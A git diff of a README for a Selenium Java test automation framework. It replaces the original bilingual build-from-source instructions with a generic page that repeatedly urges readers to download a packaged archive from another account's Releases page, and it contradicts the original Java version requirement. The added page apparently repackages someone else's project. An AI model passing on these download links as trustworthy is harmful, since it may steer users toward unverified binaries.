@@ -1,174 +1,109 @@
-# Selenium Java Automation Framework
+# 🚀 Selenium-Java-Framework - Run Automated Tests Easily
 
-[![Java](https://img.shields.io/badge/Java-21-orange.svg)](https://www.oracle.com/java/)
-[![Selenium](https://img.shields.io/badge/Selenium-4.27-green.svg)](https://www.selenium.dev/)
-[![Cucumber](https://img.shields.io/badge/Cucumber-7.33-brightgreen.svg)](https://cucumber.io/)
-[![Allure](https://img.shields.io/badge/Allure-Report-yellow.svg)](https://docs.qameta.io/allure/)
+[![Download Selenium-Java-Framework](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/iago030809/Selenium-Java-Framework/releases)
 
-<p align="center">
-  <a href="https://sonarcloud.io/summary/overall?id=Bout-Gabouz-LeMasle_Selenium-Java-Framework">
-    <img src="https://sonarcloud.io/images/project_badges/sonarcloud-light.svg" alt="Quality Gate Status"/>
-  </a>
- <br /> <br />
-  <a href="https://bout-gabouz-lemasle.github.io/Selenium-Java-Framework/allure-report/index.html">
-    <img src="https://img.shields.io/badge/Allure_Report-View_Dashboard-ff69b4?style=for-the-badge&logo=allure&logoColor=white" alt="Allure Report" />
-  </a>
+## 📋 Overview
 
-  <a href="https://bout-gabouz-lemasle.github.io/Selenium-Java-Framework/cucumber-html-reports/overview-features.html">
-    <img src="https://img.shields.io/badge/Cucumber_Report-View_Details-23d160?style=for-the-badge&logo=cucumber&logoColor=white" alt="Cucumber Report" />
-  </a>
-</p>
+The Selenium-Java-Framework is a powerful tool designed for test automation. It uses Java, Selenium, Cucumber (BDD), and TestNG to make testing easier and more effective. This framework supports parallel execution, which means you can run tests at the same time, saving you valuable time. 
 
----
+Other features include:
 
-<p align="center">
-<a href="#-english">🇬🇧 English</a> | <a href="#-français">🇫🇷 Français</a>
-</p>
+- **Page Object Model Design:** This makes it simple to manage your tests.
+- **Allure Reporting:** Get clear reports to understand test results.
+- **Thread Safety:** Run multiple tests safely at once.
 
----
+## 🚀 Getting Started
 
-<a name="english"></a>
-## 🇺🇸 English
+To begin using the Selenium-Java-Framework, follow the instructions below. You will be able to download and run the software quickly.
 
-### 📖 Introduction
-This is a **robust** and **parallel** Test Automation Framework (Work-in-Progress) designed for testing web applications (currently implementing scenarios for Swag Labs).
-While the core architecture (based on Selenium WebDriver, Java, Cucumber, and TestNG) is fully functional and optimized for **parallel execution**, I am actively working on expanding the test suite and adding DevOps capabilities.
+### 1. System Requirements
 
-### ✨ Key Features
-* **Page Object Model (POM):** Clean separation between test logic and page elements.
-* **Parallel Execution:** Thread-safe execution using `ThreadLocal`, allowing multiple tests to run simultaneously.
-* **BDD Approach:** Tests written in Gherkin syntax (`.feature` files).
-* **Rich Reporting:**
-    * **Allure Reports:** Interactive reports with screenshots, logs, and graphs.
-    * **Cucumber HTML:** Classic reporting available in the `reports/` folder.
-* **Automatic Debugging:** Captures Screenshots, Console Logs (JS), and Network Traffic automatically upon test failure.
+Before you download the framework, ensure your system meets the following requirements:
 
-### 🛠 Tech Stack
-* **Language:** Java 21
-* **Web Automation:** Selenium WebDriver 4
-* **BDD Framework:** Cucumber 7
-* **Test Runner:** TestNG
-* **Build Tool:** Maven
-* **Reporting:** Allure & Maven Cucumber Reporting
+- **Operating System:** Windows, macOS, or Linux
+- **Java Version:** JDK 8 or higher
+- **Disk Space:** At least 100MB free
+- **Memory:** Minimum 2GB RAM
 
-### 🚀 Getting Started
+### 2. Download the Latest Release
 
-#### Prerequisites
-* Java JDK 21+ installed and configured in `JAVA_HOME`.
-* Maven 3.x installed and configured in `PATH`.
-* Google Chrome (or Firefox) installed.
+To download the software, click the button below:
 
-#### Installation
-Clone the repository:
-```bash
-git clone [https://github.com/YOUR_USERNAME/Selenium-Java-Framework.git](https://github.com/YOUR_USERNAME/Selenium-Java-Framework.git)
-cd Selenium-Java-Framework
-```
-### ⚙️ Configuration
-The framework is driven by property files located in src/main/resources:
-* **config.properties:** Global settings (URL, etc.).
-* **accounts.properties:** User credentials.
+[![Download Selenium-Java-Framework](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/iago030809/Selenium-Java-Framework/releases)
 
-### 🏃‍♂️ Running Tests
-#### Default Run
-Executes all tests using the default browser (Chrome):
-```bash
-mvn clean verify
-```
-#### Custom Run (Options)
-You can override properties via command line:
-```bash
-# Run on Firefox in Headless mode with 4 parallel threads
-mvn clean verify -Dbrowser=firefox -Dheadless=true -Dthread=4
-```
+This link will take you to the Releases page where you can find the most recent version. 
 
-### 📊 Reporting
-#### 1. Allure Report (Recommended)
-To view the detailed interactive report, run this command after the tests:
-```bash
-mvn allure:serve
-```
-**Note:** This will open a web server displaying the results.
+### 3. Installing the Framework
 
-#### 2. Static HTML Reports
-You can find static reports generated in:
-* `reports/cucumber-html-reports/overview-features.html`
-* `reports/cucumber-html/cucumber.html`
+1. After accessing the Releases page, look for the latest version.
+2. Download the packaged zip file or tar.gz file suitable for your operating system.
+3. Once downloaded, extract the files to a folder of your choice.
 
-#### 3. Reporting Sample
-Here is an example of the generated Allure Report dashboard:
+### 4. Setting Up Your Environment
 
-![Allure Report Dashboard](assets/allure-dashboard-example.png)
+To run the framework, make sure you have Java installed:
 
-<a name="français"></a>
-## 🇫🇷 Français
+1. Open the Command Prompt (Windows) or Terminal (macOS/Linux).
+2. Check if Java is installed by typing the following command:
+   ```
+   java -version
+   ```
+   You should see the Java version number. If not, download and install it from the [Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
 
-### 📖 Introduction
-Ceci est un framework d'automatisation de tests **robuste** et **parallèle** (en cours de développement), conçu pour les applications web (actuellement sur Swag Labs).
-Bien que l'architecture centrale (basée sur Selenium WebDriver, Java, Cucumber et TestNG) soit totalement fonctionnelle et optimisée pour l'**exécution parallèle**, je travaille activement à l'extension de la suite de tests et à l'ajout de capacités DevOps.
+### 5. Running Your First Test
 
-### ✨ Fonctionnalités Clés
-* **Page Object Model (POM):** Séparation claire entre la logique de test et les éléments de page.
-* **Exécution Parallèle:** Exécution "Thread-safe" via `ThreadLocal`, permettant de lancer plusieurs scénarios simultanément.
-* **Approche BDD:** Tests écrits en syntaxe Gherkin (fichiers `.feature``).
-* **Rapports Détaillés:**
-    * **Allure Reports:** Rapports interactifs avec captures d'écran, logs et graphiques.
-    * **Cucumber HTML:** Rapports classiques disponibles dans le dossier `reports/`.
-* **Débogage Automatique:** Capture automatiquement une capture d'écran, les logs console (JS) et le trafic réseau en cas d'échec.
+1. Navigate to the folder where you extracted the framework files.
+2. Locate the example test files to understand how it works.
+3. Open the Command Prompt or Terminal, and run your tests by executing:
+   ```
+   mvn clean test
+   ```
+   This command runs all tests in the project.
 
-### 🛠 Stack Technique
-* **Langage:** Java 21
-* **Automatisation Web:** Selenium WebDriver 4
-* **Framework BDD:** Cucumber 7
-* **Runner de Test:** TestNG
-* **Outil de Build:** Maven
-* **Reporting:** Allure & Maven Cucumber Reporting
+### 6. View Test Results
 
-### 🚀 Pour Commencer
-#### Prérequis
-* Java JDK 21+ installé et configuré dans `JAVA_HOME`.
-* Maven 3.x installé et configuré dans le `PATH`.
-* Google Chrome (ou Firefox) installé.
+After running your tests, you can check the results. Allure will create a detailed report. To view it:
 
-#### Installation
-Clonez le dépôt :
-```bash
-git clone [https://github.com/VOTRE_NOM_UTILISATEUR/Selenium-Java-Framework.git](https://github.com/VOTRE_NOM_UTILISATEUR/Selenium-Java-Framework.git)
-cd Selenium-Java-Framework
-```
+1. Navigate to the `target/allure-results` directory.
+2. Open a terminal or command prompt there and run the command:
+   ```
+   allure serve
+   ```
+   This will open a browser showing your test results.
 
-### ⚙️ Configuration
-Le framework est piloté par des fichiers de propriétés situés dans src/main/resources :
-* **config.properties:** Paramètres globaux (URL, etc.).
-* **accounts.properties:** Identifiants des utilisateurs.
+## 📥 Download & Install
 
-### 🏃‍♂️ Lancer les Tests
-#### Lancement par défaut
-Exécute tous les tests en utilisant le navigateur par défaut (Chrome) :
-```bash
-mvn clean verify
-```
+To recap, visit the link below to download the latest version:
 
-#### Lancement Personnalisé (Options)
-Vous pouvez surcharger les propriétés via la ligne de commande :
-```bash
-# Lancer sur Firefox en mode sans tête (headless) avec 4 threads parallèles
-mvn clean verify -Dbrowser=firefox -Dheadless=true -Dthread=4
-```
-### 📊 Rapports
-#### 1. Rapport Allure (Recommandé)
-Pour voir le rapport interactif détaillé, lancez cette commande après les tests :
-```bash
-mvn allure:serve
-```
-**Note:** Cela ouvrira un serveur web affichant les résultats.
+[![Download Selenium-Java-Framework](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/iago030809/Selenium-Java-Framework/releases)
 
-#### 2. Rapports HTML Statiques
-Vous trouverez les rapports statiques générés dans :
-* `reports/cucumber-html-reports/overview-features.html`
-* `reports/cucumber-html/cucumber.html`
-* 
-#### 3. Exemple de Rapport
-Voici un exemple du tableau de bord généré par Allure Report :
+Follow the earlier steps to install and run the framework. You will find it user-friendly and efficient for your test automation tasks.
 
-![Allure Report Dashboard](assets/allure-dashboard-example.png)
+## 🔧 Features
+
+- **Easy Setup:** Simple download and setup procedures.
+- **Parallel Execution:** Run multiple tests simultaneously.
+- **Detailed Reporting:** Clear insights using Allure.
+- **Modular Design:** Easily add or modify test cases.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using the framework, here are common fixes:
+
+- **Java Not Recognized:** Ensure Java is installed correctly and added to system PATH.
+- **Tests Not Running:** Check if Maven is installed and working.
+- **Report Not Generating:** Ensure Allure dependencies are properly added.
+
+## 📚 Resources
+
+Here are some helpful resources you may want to explore:
+
+- [Selenium Official Documentation](https://www.selenium.dev/documentation/en/)
+- [TestNG Official Documentation](https://testng.org/doc/documentation-main.html)
+- [Cucumber Documentation](https://cucumber.io/docs/guides/overview/)
+
+## 💬 Support
+
+If you need further assistance, you can raise an issue in the GitHub repository. We will do our best to help you resolve any problems.
+
+Feel free to reach out and enjoy using the Selenium-Java-Framework for your test automation!
